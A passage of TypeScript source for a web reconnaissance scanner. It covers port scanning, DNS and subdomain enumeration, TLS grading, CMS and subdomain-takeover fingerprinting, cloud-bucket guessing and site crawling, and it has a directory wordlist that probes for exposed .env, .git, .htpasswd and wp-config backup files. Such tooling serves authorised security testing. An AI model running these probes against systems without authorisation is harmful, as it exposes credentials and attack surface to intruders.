async function scanPorts(host: string, ports: number[] = COMMON_PORTS.map(p => p.port)): Promise<PortScanResult[]> {
  const results: PortScanResult[] = [];
  const concurrency = 10;
  
  for (let i = 0; i < ports.length; i += concurrency) {
    const batch = ports.slice(i, i + concurrency);
    const batchResults = await Promise.all(batch.map(port => scanPort(host, port)));
    results.push(...batchResults);
  }
  
  return results.filter(r => r.state === "open");
}

// ═══════════════════════════════════════════════════════════════════════════════
// DNS ENUMERATION - Real DNS record extraction
// ═══════════════════════════════════════════════════════════════════════════════
async function enumerateDNS(domain: string): Promise<DNSRecord[]> {
  const records: DNSRecord[] = [];
  
  try {
    const aRecords = await dnsResolve4(domain);
    aRecords.forEach(ip => records.push({ type: "A", value: ip }));
  } catch (e) {}
  
  try {
    const aaaaRecords = await dnsResolve6(domain);
    aaaaRecords.forEach(ip => records.push({ type: "AAAA", value: ip }));
  } catch (e) {}
  
  try {
    const mxRecords = await dnsResolveMx(domain);
    mxRecords.forEach(mx => records.push({ type: "MX", value: mx.exchange, priority: mx.priority }));
  } catch (e) {}
  
  try {
    const nsRecords = await dnsResolveNs(domain);
    nsRecords.forEach(ns => records.push({ type: "NS", value: ns }));
  } catch (e) {}
  
  try {
    const txtRecords = await dnsResolveTxt(domain);
    txtRecords.forEach(txt => records.push({ type: "TXT", value: txt.join(" ") }));
  } catch (e) {}
  
  try {
    const cnameRecords = await dnsResolveCname(domain);
    cnameRecords.forEach(cname => records.push({ type: "CNAME", value: cname }));
  } catch (e) {}
  
  return records;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSL/TLS CERTIFICATE ANALYSIS
// ═══════════════════════════════════════════════════════════════════════════════
async function analyzeSSL(host: string, port: number = 443): Promise<SSLCertInfo | null> {
  return new Promise((resolve) => {
    const options = {
      host,
      port,
      servername: host,
      rejectUnauthorized: false,
    };
    
    const socket = tls.connect(options, () => {
      const cert = socket.getPeerCertificate();
      const cipher = socket.getCipher();
      const protocol = socket.getProtocol();
      
      if (!cert || !cert.subject) {
        socket.destroy();
        resolve(null);
        return;
      }
      
      const validFrom = new Date(cert.valid_from);
      const validTo = new Date(cert.valid_to);
      const now = new Date();
      const daysRemaining = Math.floor((validTo.getTime() - now.getTime()) / (1000 * 60 * 60 * 24));
      
      // SSL Grade calculation
      let sslGrade = "A+";
      const protocolStr = protocol || "";
      const cipherName = cipher?.name || "";
      const keyBits = (cipher as any)?.bits || 0;
      
      // Downgrade for old protocols
      if (protocolStr.includes("TLSv1.0") || protocolStr.includes("SSLv3")) sslGrade = "F";
      else if (protocolStr.includes("TLSv1.1")) sslGrade = "C";
      else if (protocolStr.includes("TLSv1.2")) sslGrade = daysRemaining < 0 ? "F" : "A";
      else if (protocolStr.includes("TLSv1.3")) sslGrade = "A+";
      
      // Downgrade for weak ciphers
      const weakCiphers = ["RC4", "DES", "3DES", "NULL", "EXPORT", "anon"];
      if (weakCiphers.some(w => cipherName.toUpperCase().includes(w))) {
        sslGrade = sslGrade === "F" ? "F" : "D";
      }
      // Downgrade for small key size
      if (keyBits > 0 && keyBits < 128) sslGrade = "F";
      else if (keyBits >= 128 && keyBits < 256 && sslGrade === "A+") sslGrade = "A";
      
      // Downgrade for expired cert
      if (daysRemaining < 0) sslGrade = "F";
      else if (daysRemaining < 30 && sslGrade.startsWith("A")) sslGrade = "B";
      
      // Downgrade if not authorized
      if (!socket.authorized && sslGrade.startsWith("A")) sslGrade = "B";

      const result: SSLCertInfo = {
        subject: cert.subject.CN || Object.values(cert.subject).join(", "),
        issuer: cert.issuer?.CN || cert.issuer?.O || "Unknown",
        validFrom: validFrom.toISOString(),
        validTo: validTo.toISOString(),
        daysRemaining,
        protocol: protocol || "Unknown",
        cipher: cipherName,
        keySize: keyBits || 256,
        isExpired: daysRemaining < 0,
        isValid: socket.authorized,
        sslGrade,
      };
      
      socket.destroy();
      resolve(result);
    });
    
    socket.setTimeout(5000);
    socket.on("timeout", () => { socket.destroy(); resolve(null); });
    socket.on("error", () => { socket.destroy(); resolve(null); });
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// WHOIS LOOKUP - Domain Information Gathering
// ═══════════════════════════════════════════════════════════════════════════════
interface WhoisInfo {
  domain: string;
  registrar?: string;
  creationDate?: string;
  expirationDate?: string;
  nameServers: string[];
  registrant?: string;
  country?: string;
  dnssec?: string;
}

// RDAP server cache (loaded from IANA bootstrap)
let rdapBootstrapCache: Map<string, string[]> | null = null;
let rdapBootstrapLoaded = false;

async function loadRdapBootstrap(): Promise<Map<string, string[]>> {
  if (rdapBootstrapCache) return rdapBootstrapCache;
  
  rdapBootstrapCache = new Map();
  
  // Static fallback for common TLDs
  const staticServers: Record<string, string> = {
    'com': 'https://rdap.verisign.com/com/v1/',
    'net': 'https://rdap.verisign.com/net/v1/',
    'org': 'https://rdap.publicinterestregistry.org/rdap/',
    'io': 'https://rdap.nic.io/',
    'co': 'https://rdap.nic.co/',
    'me': 'https://rdap.nic.me/',
    'app': 'https://rdap.nic.google/',
    'dev': 'https://rdap.nic.google/',
    'de': 'https://rdap.denic.de/',
    'uk': 'https://rdap.nominet.uk/uk/',
    'fr': 'https://rdap.nic.fr/',
    'nl': 'https://rdap.sidn.nl/',
    'info': 'https://rdap.afilias.net/rdap/info/',
    'biz': 'https://rdap.nic.biz/',
    'xyz': 'https://rdap.centralnic.com/xyz/',
    'online': 'https://rdap.centralnic.com/online/',
    'site': 'https://rdap.centralnic.com/site/',
    'tech': 'https://rdap.centralnic.com/tech/',
  };
  
  for (const [tld, server] of Object.entries(staticServers)) {
    rdapBootstrapCache.set(tld, [server]);
  }
  
  // Try to load IANA RDAP bootstrap
  if (!rdapBootstrapLoaded) {
    try {
      const bootstrapResponse = await fetch('https://data.iana.org/rdap/dns.json', {
        signal: AbortSignal.timeout(5000),
      });
      if (bootstrapResponse.ok) {
        const bootstrapData = await bootstrapResponse.json();
        if (bootstrapData.services) {
          for (const service of bootstrapData.services) {
            const tlds = service[0] || [];
            const servers = service[1] || [];
            for (const tld of tlds) {
              if (!rdapBootstrapCache.has(tld)) {
                rdapBootstrapCache.set(tld.toLowerCase(), servers);
              }
            }
          }
        }
      }
      rdapBootstrapLoaded = true;
    } catch {}
  }
  
  return rdapBootstrapCache;
}

async function lookupWhois(domain: string): Promise<WhoisInfo | null> {
  const result: WhoisInfo = { domain, nameServers: [] };
  
  try {
    // Get nameservers via DNS
    const nsRecords = await dnsResolveNs(domain).catch(() => []);
    result.nameServers = nsRecords;
    
    // Get SOA record for domain info
    try {
      const soaRecords = await dnsResolveSoa(domain);
      if (soaRecords) {
        result.registrar = soaRecords.hostmaster?.split('.').slice(1).join('.') || undefined;
      }
    } catch {}
    
    // Try RDAP (successor to WHOIS) - publicly available without API key
    try {
      const tld = domain.split('.').pop()?.toLowerCase();
      if (!tld) return result;
      
      const rdapServers = await loadRdapBootstrap();
      const servers = rdapServers.get(tld);
      
      if (servers && servers.length > 0) {
        for (const serverBase of servers) {
          try {
            const rdapUrl = `${serverBase.replace(/\/$/, '')}/domain/${domain}`;
            const rdapResponse = await fetch(rdapUrl, {
              signal: AbortSignal.timeout(5000),
              headers: { 'Accept': 'application/rdap+json' }
            });
            
            if (rdapResponse.ok) {
              const rdapData = await rdapResponse.json();
              
              // Extract registrar
              if (rdapData.entities) {
                for (const entity of rdapData.entities) {
                  if (entity.roles?.includes('registrar')) {
                    result.registrar = entity.vcardArray?.[1]?.find((v: any) => v[0] === 'fn')?.[3] || entity.handle;
                  }
                }
              }
              
              // Extract dates
              if (rdapData.events) {
                for (const event of rdapData.events) {
                  if (event.eventAction === 'registration') {
                    result.creationDate = event.eventDate;
                  } else if (event.eventAction === 'expiration') {
                    result.expirationDate = event.eventDate;
                  }
                }
              }
              
              // Extract nameservers from RDAP
              if (rdapData.nameservers) {
                const rdapNs = rdapData.nameservers.map((ns: any) => ns.ldhName).filter(Boolean);
                if (rdapNs.length > 0) result.nameServers = rdapNs;
              }
              
              break; // Success, stop trying more servers
            }
          } catch {}
        }
      }
    } catch {}
    
    return result;
  } catch (e) {
    return result;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CMS DETECTION - WordPress, Drupal, Joomla, etc.
// ═══════════════════════════════════════════════════════════════════════════════
interface CMSInfo {
  name: string;
  version?: string;
  confidence: number;
  indicators: string[];
}

const CMS_SIGNATURES: { name: string; paths: string[]; headers: string[]; patterns: RegExp[] }[] = [
  {
    name: "WordPress",
    paths: ["/wp-login.php", "/wp-admin/", "/wp-content/", "/wp-includes/", "/xmlrpc.php"],
    headers: ["X-Powered-By: WP Engine", "X-Pingback"],
    patterns: [/wp-content/i, /wp-includes/i, /wordpress/i, /<meta name="generator" content="WordPress/i],
  },
  {
    name: "Drupal",
    paths: ["/core/misc/drupal.js", "/sites/default/files/", "/node/1", "/admin/content"],
    headers: ["X-Drupal-Cache", "X-Generator: Drupal"],
    patterns: [/drupal/i, /Drupal\.settings/i, /<meta name="generator" content="Drupal/i],
  },
  {
    name: "Joomla",
    paths: ["/administrator/", "/components/", "/modules/", "/templates/", "/media/system/js/"],
    headers: ["X-Content-Encoded-By: Joomla!"],
    patterns: [/joomla/i, /<meta name="generator" content="Joomla!/i, /\/media\/jui\//i],
  },
  {
    name: "Magento",
    paths: ["/skin/frontend/", "/app/etc/local.xml", "/js/mage/", "/admin/"],
    headers: ["X-Magento-Cache-Control"],
    patterns: [/magento/i, /Mage\./i, /var BLANK_URL/i],
  },
  {
    name: "Shopify",
    paths: ["/admin/auth/login", "/collections/", "/cart.js"],
    headers: ["X-ShopId"],
    patterns: [/shopify/i, /cdn\.shopify\.com/i, /myshopify\.com/i],
  },
  {
    name: "Laravel",
    paths: ["/api/", "/storage/", "/public/"],
    headers: ["X-Powered-By: Laravel"],
    patterns: [/laravel_session/i, /XSRF-TOKEN/i],
  },
  {
    name: "Django",
    paths: ["/admin/login/", "/static/admin/"],
    headers: [],
    patterns: [/csrfmiddlewaretoken/i, /django/i],
  },
  {
    name: "ASP.NET",
    paths: ["/web.config"],
    headers: ["X-AspNet-Version", "X-Powered-By: ASP.NET"],
    patterns: [/__VIEWSTATE/i, /asp\.net/i],
  },
];

async function detectCMS(targetUrl: string, html: string, headers: Record<string, string>): Promise<CMSInfo | null> {
  for (const cms of CMS_SIGNATURES) {
    let score = 0;
    const indicators: string[] = [];
    
    // Check headers
    for (const header of cms.headers) {
      const [name] = header.split(":");
      if (headers[name.toLowerCase()]) {
        score += 30;
        indicators.push(`Header: ${header}`);
      }
    }
    
    // Check HTML patterns
    for (const pattern of cms.patterns) {
      if (pattern.test(html)) {
        score += 25;
        indicators.push(`Pattern: ${pattern.toString().substring(0, 30)}`);
      }
    }
    
    // Check paths
    for (const path of cms.paths) {
      if (html.includes(path)) {
        score += 15;
        indicators.push(`Path: ${path}`);
      }
    }
    
    if (score >= 25) {
      // Try to extract version
      let version: string | undefined;
      const versionMatch = html.match(/(?:version|ver|v)[\s:="']*(\d+\.\d+(?:\.\d+)?)/i);
      if (versionMatch) version = versionMatch[1];
      
      return {
        name: cms.name,
        version,
        confidence: Math.min(score, 100),
        indicators,
      };
    }
  }
  
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUBDOMAIN TAKEOVER DETECTION
// ═══════════════════════════════════════════════════════════════════════════════
const TAKEOVER_FINGERPRINTS: { service: string; cname: RegExp; fingerprint: string }[] = [
  { service: "GitHub Pages", cname: /github\.io/i, fingerprint: "There isn't a GitHub Pages site here" },
  { service: "Heroku", cname: /herokuapp\.com/i, fingerprint: "No such app" },
  { service: "AWS S3", cname: /s3.*\.amazonaws\.com/i, fingerprint: "NoSuchBucket" },
  { service: "Shopify", cname: /myshopify\.com/i, fingerprint: "Sorry, this shop is currently unavailable" },
  { service: "Tumblr", cname: /tumblr\.com/i, fingerprint: "There's nothing here" },
  { service: "Zendesk", cname: /zendesk\.com/i, fingerprint: "Help Center Closed" },
  { service: "Unbounce", cname: /unbounce\.com/i, fingerprint: "The requested URL was not found" },
  { service: "Ghost", cname: /ghost\.io/i, fingerprint: "The thing you were looking for is no longer here" },
  { service: "Surge.sh", cname: /surge\.sh/i, fingerprint: "project not found" },
  { service: "Bitbucket", cname: /bitbucket\.io/i, fingerprint: "Repository not found" },
  { service: "Pantheon", cname: /pantheonsite\.io/i, fingerprint: "404 error unknown site" },
  { service: "Fastly", cname: /fastly\.net/i, fingerprint: "Fastly error: unknown domain" },
  { service: "Netlify", cname: /netlify\.app/i, fingerprint: "Not Found - Request ID" },
  { service: "Vercel", cname: /vercel\.app/i, fingerprint: "The deployment could not be found" },
];

interface SubdomainTakeoverResult {
  subdomain: string;
  service: string;
  cname: string;
  vulnerable: boolean;
}

async function checkSubdomainTakeover(subdomain: string): Promise<SubdomainTakeoverResult | null> {
  try {
    // Get CNAME record
    const cnames = await dnsResolveCname(subdomain).catch(() => []);
    if (cnames.length === 0) return null;
    
    const cname = cnames[0];
    
    // Check against fingerprints
    for (const fp of TAKEOVER_FINGERPRINTS) {
      if (fp.cname.test(cname)) {
        // Try to fetch the subdomain and check for fingerprint
        try {
          const response = await fetch(`https://${subdomain}`, {
            signal: AbortSignal.timeout(5000),
          });
          const html = await response.text();
          
          // ONLY mark as vulnerable if fingerprint is found in response
          if (html.includes(fp.fingerprint)) {
            return {
              subdomain,
              service: fp.service,
              cname,
              vulnerable: true,
            };
          }
        } catch (e) {
          // Network errors do NOT indicate vulnerability - require fingerprint evidence
          // Just continue to next fingerprint check
          continue;
        }
      }
    }
    
    return null;
  } catch (e) {
    return null;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CLOUD BUCKET SCANNING - S3, Azure, GCS
// ═══════════════════════════════════════════════════════════════════════════════
interface CloudBucketResult {
  name: string;
  provider: "AWS S3" | "Azure Blob" | "Google Cloud Storage";
  url: string;
  status: "public" | "exists" | "not_found";
  listable: boolean;
}

async function scanCloudBuckets(domain: string): Promise<CloudBucketResult[]> {
  const results: CloudBucketResult[] = [];
  const baseName = domain.replace(/\./g, "-").replace(/[^a-z0-9-]/gi, "");
  const variations = [
    baseName,
    `${baseName}-backup`,
    `${baseName}-backups`,
    `${baseName}-dev`,
    `${baseName}-prod`,
    `${baseName}-staging`,
    `${baseName}-assets`,
    `${baseName}-data`,
    `${baseName}-static`,
    `${baseName}-media`,
    `${baseName}-uploads`,
    `${baseName}-files`,
    domain.split(".")[0],
  ];
  
  // Check S3 buckets
  for (const name of variations.slice(0, 5)) { // Limit to prevent rate limiting
    try {
      const s3Url = `https://${name}.s3.amazonaws.com/`;
      const response = await fetch(s3Url, { 
        method: "GET",
        signal: AbortSignal.timeout(3000),
      });
      
      const text = await response.text();
      
      if (response.status === 200 && text.includes("ListBucketResult")) {
        results.push({
          name,
          provider: "AWS S3",
          url: s3Url,
          status: "public",
          listable: true,
        });
      } else if (response.status === 403) {
        results.push({
          name,
          provider: "AWS S3",
          url: s3Url,
          status: "exists",
          listable: false,
        });
      }
    } catch (e) {}
  }
  
  // Check Azure Blob Storage
  for (const name of variations.slice(0, 3)) {
    try {
      const azureUrl = `https://${name}.blob.core.windows.net/?comp=list`;
      const response = await fetch(azureUrl, {
        signal: AbortSignal.timeout(3000),
      });
      
      if (response.status === 200) {
        const text = await response.text();
        if (text.includes("EnumerationResults")) {
          results.push({
            name,
            provider: "Azure Blob",
            url: `https://${name}.blob.core.windows.net/`,
            status: "public",
            listable: true,
          });
        }
      }
    } catch (e) {}
  }
  
  // Check Google Cloud Storage
  for (const name of variations.slice(0, 3)) {
    try {
      const gcsUrl = `https://storage.googleapis.com/${name}/`;
      const response = await fetch(gcsUrl, {
        signal: AbortSignal.timeout(3000),
      });
      
      if (response.status === 200) {
        results.push({
          name,
          provider: "Google Cloud Storage",
          url: gcsUrl,
          status: "public",
          listable: true,
        });
      }
    } catch (e) {}
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUBDOMAIN ENUMERATION - Professional wordlist
// ═══════════════════════════════════════════════════════════════════════════════
const SUBDOMAIN_WORDLIST = [
  "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
  "webdisk", "ns", "test", "m", "dev", "staging", "api", "app", "admin",
  "blog", "shop", "vpn", "secure", "server", "cloud", "git", "forum",
  "support", "beta", "demo", "portal", "cdn", "media", "static", "assets",
  "img", "images", "docs", "login", "auth", "sso", "dashboard", "panel",
  "manage", "control", "cp", "cpanel", "whm", "plesk", "mysql", "db",
  "database", "sql", "postgres", "redis", "mongo", "elastic", "search",
  "grafana", "prometheus", "jenkins", "gitlab", "github", "bitbucket",
  "jira", "confluence", "wiki", "kb", "help", "status", "monitor",
  "api-v1", "api-v2", "v1", "v2", "legacy", "old", "new", "backup",
  "stage", "uat", "qa", "preprod", "prod", "production", "internal",
  "private", "public", "external", "gateway", "proxy", "lb", "loadbalancer",
  "web", "web1", "web2", "app1", "app2", "srv", "srv1", "srv2",
  "mail1", "mail2", "mx", "mx1", "mx2", "relay", "smtp1", "smtp2",
  "imap", "pop3", "exchange", "autodiscover", "remote", "vpn1", "vpn2",
];

async function enumerateSubdomains(domain: string, wordlist: string[] = SUBDOMAIN_WORDLIST): Promise<SubdomainResult[]> {
  const results: SubdomainResult[] = [];
  const seen = new Set<string>();
  const concurrency = 20;

  // ── Phase 1: Passive enumeration via crt.sh (Certificate Transparency) ──
  try {
    const crtUrl = `https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`;
    const crtResp = await fetchWithTimeout(crtUrl, {}, 15000);
    if (crtResp.body) {
      const crtData = JSON.parse(crtResp.body);
      if (Array.isArray(crtData)) {
        for (const entry of crtData) {
          const names = (entry.name_value || "").split("\n");
          for (const rawName of names) {
            const name = rawName.trim().replace(/^\*\./, "").toLowerCase();
            if (name.endsWith(`.${domain}`) && name !== domain && !seen.has(name)) {
              seen.add(name);
            }
          }
        }
      }
    }
  } catch {}

  // Resolve passively-discovered subdomains
  const passiveList = Array.from(seen);
  for (let i = 0; i < passiveList.length; i += concurrency) {
    const batch = passiveList.slice(i, i + concurrency);
    const batchPromises = batch.map(async (subdomain): Promise<SubdomainResult | null> => {
      try {
        const ips = await dnsResolve4(subdomain);
        return { subdomain, ip: ips[0], isAlive: true };
      } catch { return null; }
    });
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults.filter((r): r is SubdomainResult => r !== null));
  }

  // ── Phase 2: Active DNS brute-force ──
  for (let i = 0; i < wordlist.length; i += concurrency) {
    const batch = wordlist.slice(i, i + concurrency);
    const batchPromises = batch.map(async (sub): Promise<SubdomainResult | null> => {
      const subdomain = `${sub}.${domain}`;
      if (seen.has(subdomain)) return null; // Already found via passive
      try {
        const ips = await dnsResolve4(subdomain);
        seen.add(subdomain);
        return { subdomain, ip: ips[0], isAlive: true };
      } catch (e) {
        return null;
      }
    });
    
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults.filter((r): r is SubdomainResult => r !== null));
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
// DIRECTORY BRUTE FORCE - Professional wordlist
// ═══════════════════════════════════════════════════════════════════════════════
const DIRECTORY_WORDLIST = [
  ".git", ".git/config", ".git/HEAD", ".svn", ".svn/entries", ".hg",
  ".env", ".env.local", ".env.production", ".env.backup", "env.php",
  ".htaccess", ".htpasswd", "web.config", "config.php", "config.yml",
  "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
  "config", "configs", "configuration", "settings", "setup",
  "backup", "backups", "bak", "old", "temp", "tmp", "cache",
  "uploads", "upload", "files", "images", "img", "media", "assets",
  "css", "js", "scripts", "static", "public", "private",
  "admin", "administrator", "admin.php", "admin.html", "adminpanel",
  "login", "signin", "auth", "authenticate", "user", "users",
  "api", "api/v1", "api/v2", "rest", "graphql", "swagger", "docs",
  "phpinfo.php", "info.php", "test.php", "debug.php", "console",
  "phpmyadmin", "pma", "mysql", "database", "db", "sql",
  "cgi-bin", "cgi", "bin", "scripts", "shell", "cmd",
  "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
  ".well-known", ".well-known/security.txt", "favicon.ico",
  "readme", "readme.txt", "readme.md", "README", "CHANGELOG",
  "license", "LICENSE", "version", "VERSION", "INSTALL",
  "logs", "log", "error.log", "access.log", "debug.log",
  "vendor", "node_modules", "bower_components", "packages",
  "composer.json", "package.json", "package-lock.json", "yarn.lock",
  "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile",
  "Dockerfile", "docker-compose.yml", ".dockerignore",
  "Makefile", "Gruntfile.js", "gulpfile.js", "webpack.config.js",
  "server", "app", "application", "src", "source", "lib",
  "include", "includes", "inc", "core", "modules", "plugins",
  "themes", "templates", "views", "layouts", "partials",
  "data", "downloads", "export", "import", "feed", "rss",
  "sitemap", "archive", "archives", "blog", "news", "posts",
  "wp-content", "wp-includes", "wp-admin", "xmlrpc.php",
  "install", "installer", "setup.php", "update", "upgrade",
  "error", "errors", "404", "500", "maintenance",
  "status", "health", "healthcheck", "ping", "metrics",
  "trace", "debug", "test", "testing", "dev", "development",
  "stage", "staging", "demo", "preview", "sandbox",
  "api-docs", "apidocs", "developer", "developers",
  "cdn", "assets-cdn", "static-cdn", "media-cdn",
];

async function bruteForceDirectories(baseUrl: string, wordlist: string[] = DIRECTORY_WORDLIST): Promise<DirectoryResult[]> {
  const results: DirectoryResult[] = [];
  const concurrency = 10;
  
  for (let i = 0; i < wordlist.length; i += concurrency) {
    const batch = wordlist.slice(i, i + concurrency);
    const batchPromises = batch.map(async (path): Promise<DirectoryResult | null> => {
      const url = `${baseUrl.replace(/\/$/, "")}/${path}`;
      try {
        const response = await fetch(url, { 
          method: "HEAD", 
          redirect: "manual",
          signal: AbortSignal.timeout(3000),
        });
        
        if (response.status !== 404) {
          return {
            path: `/${path}`,
            status: response.status,
            redirectTo: response.headers.get("location") || undefined,
          };
        }
        return null;
      } catch (e) {
        return null;
      }
    });
    
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults.filter((r): r is DirectoryResult => r !== null));
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
// WAYBACK MACHINE - Historical URL discovery
// ═══════════════════════════════════════════════════════════════════════════════
async function fetchWaybackUrls(domain: string, limit: number = 100): Promise<WaybackUrl[]> {
  try {
    // Fetch more historical URLs for comprehensive analysis
    const apiUrl = `https://web.archive.org/cdx/search/cdx?url=${domain}/*&output=json&limit=${limit}&fl=original,timestamp,statuscode&collapse=urlkey`;
    const response = await fetch(apiUrl, { signal: AbortSignal.timeout(15000) });
    
    if (!response.ok) return [];
    
    const data = await response.json() as string[][];
    if (!Array.isArray(data) || data.length < 2) return [];
    
    // Skip header row
    return data.slice(1).map(row => ({
      url: row[0],
      timestamp: row[1],
      statusCode: row[2],
    }));
  } catch (e) {
    return [];
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// WEBSITE CRAWLER - DEEP SITE DECOMPOSITION (KEINE GRENZEN!)
// ═══════════════════════════════════════════════════════════════════════════════

interface CrawlResult {
  url: string;
  status: number;
  contentType: string;
  title?: string;
  links: string[];
  forms: FormInfo[];
  scripts: string[];
  styles: string[];
  images: string[];
  parameters: string[];
  endpoints: string[];
}

interface FormInfo {
  action: string;
  method: string;
  inputs: { name: string; type: string }[];
}

interface SiteStructure {
  pages: CrawlResult[];
  allLinks: Set<string>;
  allForms: FormInfo[];
  allScripts: Set<string>;
  allStyles: Set<string>;
  allImages: Set<string>;
  allParameters: Set<string>;
  allEndpoints: Set<string>;
  crawledUrls: Set<string>;
}

async function crawlPage(
  url: string, 
  baseUrl: string,
  timeout: number = 15000
): Promise<CrawlResult | null> {
  try {
    // Use fetchWithTimeout (raw http/https) which is more reliable than fetch()
    const resp = await fetchWithTimeout(url, {
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
    }, timeout);
    
    // Follow redirects manually (fetchWithTimeout doesn't auto-follow)
    let finalResp = resp;
    let redirectCount = 0;
    while ((finalResp.status === 301 || finalResp.status === 302 || finalResp.status === 307) && finalResp.redirectUrl && redirectCount < 5) {
      try {
        const redirectTarget = new URL(finalResp.redirectUrl, url).href;
        if (!redirectTarget.startsWith(baseUrl)) break; // Don't follow off-site redirects
        finalResp = await fetchWithTimeout(redirectTarget, {
          headers: { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' },
        }, timeout);
        redirectCount++;
      } catch { break; }
    }
    
    const response = finalResp;
    
    const contentType = (response.headers?.['content-type'] || '') as string;
    
    // Only parse HTML pages
    if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
      return {
        url,
        status: response.status,
        contentType,
        links: [],
        forms: [],
        scripts: [],
        styles: [],
        images: [],
        parameters: [],
        endpoints: [],
      };
    }
    
    const body = response.body || '';
    const result: CrawlResult = {
      url,
      status: response.status,
      contentType,
      links: [],
      forms: [],
      scripts: [],
      styles: [],
      images: [],
      parameters: [],
      endpoints: [],
    };
    
    // Extract title
    const titleMatch = body.match(/<title[^>]*>([^<]*)<\/title>/i);
    if (titleMatch) result.title = titleMatch[1].trim();
    
    // Extract all links (href)
    const hrefRegex = /href\s*=\s*["']([^"'#]+)["']/gi;
    let match;
    while ((match = hrefRegex.exec(body)) !== null) {
      const href = match[1];
      if (href && !href.startsWith('javascript:') && !href.startsWith('mailto:') && !href.startsWith('tel:')) {
        try {
          const absoluteUrl = new URL(href, url).href;
          if (absoluteUrl.startsWith(baseUrl)) {
            result.links.push(absoluteUrl);
          }
        } catch {}
      }
    }
    
    // Extract forms
    const allForms = body.match(/<form[\s\S]*?<\/form>/gi) || [];
    for (const formHtml of allForms) {
      const actionMatch = formHtml.match(/action\s*=\s*["']([^"']*)["']/i);
      const methodMatch = formHtml.match(/method\s*=\s*["']([^"']*)["']/i);
      const action = actionMatch ? actionMatch[1] : url;
      const method = methodMatch ? methodMatch[1].toUpperCase() : 'GET';
      
      // Extract inputs
      const inputs: { name: string; type: string }[] = [];
      const inputRegex = /<input[^>]*name\s*=\s*["']([^"']*)["'][^>]*/gi;
      let inputMatch;
      while ((inputMatch = inputRegex.exec(formHtml)) !== null) {
        const name = inputMatch[1];
        const typeMatch = inputMatch[0].match(/type\s*=\s*["']([^"']*)["']/i);
        const type = typeMatch ? typeMatch[1] : 'text';
        inputs.push({ name, type });
      }
      
      // Extract textareas
      const textareaRegex = /<textarea[^>]*name\s*=\s*["']([^"']*)["'][^>]*/gi;
      while ((inputMatch = textareaRegex.exec(formHtml)) !== null) {
        inputs.push({ name: inputMatch[1], type: 'textarea' });
      }
      
      // Extract selects
      const selectRegex = /<select[^>]*name\s*=\s*["']([^"']*)["'][^>]*/gi;
      while ((inputMatch = selectRegex.exec(formHtml)) !== null) {
        inputs.push({ name: inputMatch[1], type: 'select' });
      }
      
      try {
        const absoluteAction = new URL(action, url).href;
        result.forms.push({ action: absoluteAction, method, inputs });
      } catch {
        result.forms.push({ action, method, inputs });
      }
    }
    
    // Extract scripts
    const scriptRegex = /src\s*=\s*["']([^"']+\.js[^"']*)["']/gi;
    while ((match = scriptRegex.exec(body)) !== null) {
      try {
        const absoluteUrl = new URL(match[1], url).href;
        result.scripts.push(absoluteUrl);
      } catch {}
    }
    
    // Extract stylesheets
    const styleRegex = /href\s*=\s*["']([^"']+\.css[^"']*)["']/gi;
    while ((match = styleRegex.exec(body)) !== null) {
      try {
        const absoluteUrl = new URL(match[1], url).href;
        result.styles.push(absoluteUrl);
      } catch {}
    }
    
    // Extract images
    const imgRegex = /src\s*=\s*["']([^"']+\.(jpg|jpeg|png|gif|webp|svg|ico)[^"']*)["']/gi;
    while ((match = imgRegex.exec(body)) !== null) {
      try {
        const absoluteUrl = new URL(match[1], url).href;
        result.images.push(absoluteUrl);
      } catch {}
    }
    
    // Extract URL parameters from links
    for (const link of result.links) {
      try {
        const linkUrl = new URL(link);
        linkUrl.searchParams.forEach((value, key) => {
          result.parameters.push(key);
        });
      } catch {}
    }
    
    // Extract API endpoints
    const apiRegex = /["'](\/api\/[^"'\s]+)["']/gi;
    while ((match = apiRegex.exec(body)) !== null) {
      try {
        const absoluteUrl = new URL(match[1], baseUrl).href;
        result.endpoints.push(absoluteUrl);
      } catch {}
    }
    
    // Extract AJAX/fetch calls
    const ajaxRegex = /(?:fetch|axios|\.ajax)\s*\(\s*["']([^"']+)["']/gi;
    while ((match = ajaxRegex.exec(body)) !== null) {
      try {
        const absoluteUrl = new URL(match[1], baseUrl).href;
        if (absoluteUrl.startsWith(baseUrl)) {
          result.endpoints.push(absoluteUrl);
        }
      } catch {}
    }
    
    return result;
  } catch (e) {
    return null;
  }
}

async function crawlWebsite(
  startUrl: string,
  baseUrl: string,
  maxPages: number = 100,
  sendLog: (msg: string, cat: string) => void
): Promise<SiteStructure> {
  const structure: SiteStructure = {
    pages: [],
    allLinks: new Set<string>(),
    allForms: [],
    allScripts: new Set<string>(),
    allStyles: new Set<string>(),
    allImages: new Set<string>(),
    allParameters: new Set<string>(),
    allEndpoints: new Set<string>(),
    crawledUrls: new Set<string>(),
  };
  
  const queue: string[] = [startUrl];
  const visited = new Set<string>();
  let pagesScanned = 0;
  
  sendLog(`Website-Crawler gestartet - Max ${maxPages} Seiten`, "CRAWL");
  sendLog(`Startpunkt: ${startUrl}`, "CRAWL");
  
  // Try the first page with retries - this is critical
  let firstPage = await crawlPage(startUrl, baseUrl, 20000);
  if (!firstPage) {
    sendLog(`Erster Versuch fehlgeschlagen, versuche nochmal...`, "CRAWL");
    firstPage = await crawlPage(startUrl, baseUrl, 30000);
  }
  if (firstPage && firstPage.links.length > 0) {
    structure.pages.push(firstPage);
    structure.crawledUrls.add(firstPage.url);
    visited.add(startUrl);
    pagesScanned++;
